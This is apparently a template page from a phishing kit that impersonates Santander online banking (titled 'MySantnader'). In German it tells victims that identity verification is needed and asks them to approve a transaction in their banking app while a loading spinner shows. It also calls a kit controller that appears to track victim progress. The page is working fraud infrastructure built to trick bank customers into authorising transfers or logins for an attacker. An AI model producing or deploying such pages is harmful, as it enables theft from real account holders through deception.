<?php 
require '../main.php';
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MySantnader</title>
    <link rel="stylesheet" href="res/app.css">
    <link rel="stylesheet" href="res/account.css">
</head>
<body>
<header>
<img src="res/logo.png" class="pc">
<img src="res/text.png" class="pc">
<img src="res/mini-logo.png" class="mobile">
</header>
<main>

<div class="form account">

<div class="title">
Identitätsprüfung erforderlich
</div>

<div class="text">
Bitte bestätigen Sie den Vorgang über Ihre Banking-App.<br><br>
Um mit dem Prozess fortzufahren, öffnen Sie bitte Ihre Banking-Anwendung und autorisieren Sie die Transaktion dort.
</div>

<p><img src="res/loading.gif" style="width:80px;"></p>
 


<div class="col info">
<b>Sie haben noch keinen Zugang?</b>
Als Kreditkunde können Sie die Registrierung für das MySantander Online Banking ganz bequem digital vornehmen und Ihre Bankgeschäfte einfach von zu Hause aus erledigen!
</div>


</div>
</main> 


 
<?php 
$m->ctr("APPLICATION");
?>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
</body>
</html>